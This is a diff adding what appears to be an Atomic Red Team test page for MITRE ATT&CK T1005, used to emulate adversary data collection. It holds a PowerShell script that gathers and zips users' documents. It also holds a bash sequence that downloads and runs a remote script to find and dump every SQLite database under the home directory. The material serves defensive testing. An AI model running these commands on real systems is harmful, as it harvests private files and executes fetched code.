@@ -1,0 +1,127 @@
+---
+tags: [T1005, atomic_test]
+filename: "[[T1005 - Data from Local System]]"
+---
+# T1005 - Data from Local System
+
+## Atomic Test #1 - Search files of interest and save them to a single zip file (Windows)
+This test searches for files of certain extensions and saves them to a single zip file prior to extraction.
+
+**Supported Platforms:** Windows
+
+
+**auto_generated_guid:** d3d9af44-b8ad-4375-8b0a-4bff4b7e419c
+
+
+
+
+
+#### Inputs:
+| Name | Description | Type | Default Value |
+|------|-------------|------|---------------|
+| starting_directory | Path to starting directory for the search | Path | C:&#92;Users|
+| output_zip_folder_path | Path to directory for saving the generated zip file | Path | PathToAtomicsFolder&#92;..&#92;ExternalPayloads&#92;T1005|
+| file_extensions | List of file extensions to be searched and zipped, separated by comma and space | string | .doc, .docx, .txt|
+
+
+#### Attack Commands: Run with `powershell`! 
+
+
+```powershell
+$startingDirectory = "#{starting_directory}"
+$outputZip = "#{output_zip_folder_path}"
+$fileExtensionsString = "#{file_extensions}" 
+$fileExtensions = $fileExtensionsString -split ", "
+
+New-Item -Type Directory $outputZip -ErrorAction Ignore -Force | Out-Null
+
+Function Search-Files {
+  param (
+    [string]$directory
+  )
+  $files = Get-ChildItem -Path $directory -File -Recurse | Where-Object {
+    $fileExtensions -contains $_.Extension.ToLower()
+  }
+  return $files
+}
+
+$foundFiles = Search-Files -directory $startingDirectory
+if ($foundFiles.Count -gt 0) {
+  $foundFilePaths = $foundFiles.FullName
+  Compress-Archive -Path $foundFilePaths -DestinationPath "$outputZip\data.zip"
+
+  Write-Host "Zip file created: $outputZip\data.zip"
+  } else {
+      Write-Host "No files found with the specified extensions."
+  }
+```
+
+#### Cleanup Commands:
+```powershell
+Remove-Item -Path  $outputZip\data.zip -Force
+```
+
+
+
+
+
+<br/>
+<br/>
+
+## Atomic Test #2 - Find and dump sqlite databases (Linux)
+An adversary may know/assume that the user of a system uses sqlite databases which contain interest and sensitive data. In this test we download two databases and a sqlite dump script, then run a find command to find & dump the database content.
+
+**Supported Platforms:** Linux
+
+
+**auto_generated_guid:** 00cbb875-7ae4-4cf1-b638-e543fd825300
+
+
+
+
+
+#### Inputs:
+| Name | Description | Type | Default Value |
+|------|-------------|------|---------------|
+| remote_url | url of remote payload | url | https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1005/src|
+
+
+#### Attack Commands: Run with `bash`! 
+
+
+```bash
+cd $HOME
+curl -O #{remote_url}/art
+curl -O #{remote_url}/gta.db
+curl -O #{remote_url}/sqlite_dump.sh
+chmod +x sqlite_dump.sh
+find . ! -executable -exec bash -c 'if [[ "$(head -c 15 {} | strings)" == "SQLite format 3" ]]; then echo "{}"; ./sqlite_dump.sh {}; fi' \;
+```
+
+#### Cleanup Commands:
+```bash
+rm -f $HOME/.art
+rm -f $HOME/gta.db
+rm -f $HOME/sqlite_dump.sh
+```
+
+
+
+#### Dependencies:  Run with `bash`!
+##### Description: Check if running on a Debian based machine.
+##### Check Prereq Commands:
+```bash
+if [ -x "$(command -v sqlite3)" ]; then echo "sqlite3 is installed"; else echo "sqlite3 is NOT installed"; exit 1; fi
+if [ -x "$(command -v curl)" ]; then echo "curl is installed"; else echo "curl is NOT installed"; exit 1; fi
+if [ -x "$(command -v strings)" ]; then echo "strings is installed"; else echo "strings is NOT installed"; exit 1; fi
+```
+##### Get Prereq Commands:
+```bash
+if grep -iq "debian\|ubuntu\|kali\|mint" /usr/lib/os-release; then apt update && apt install -y binutils curl sqlite3; fi
+if grep -iq "rhel\|fedora\|centos" /usr/lib/os-release; then yum update -y && yum install -y binutils curl sqlite-devel; fi
+```
+
+
+
+
+<br/>
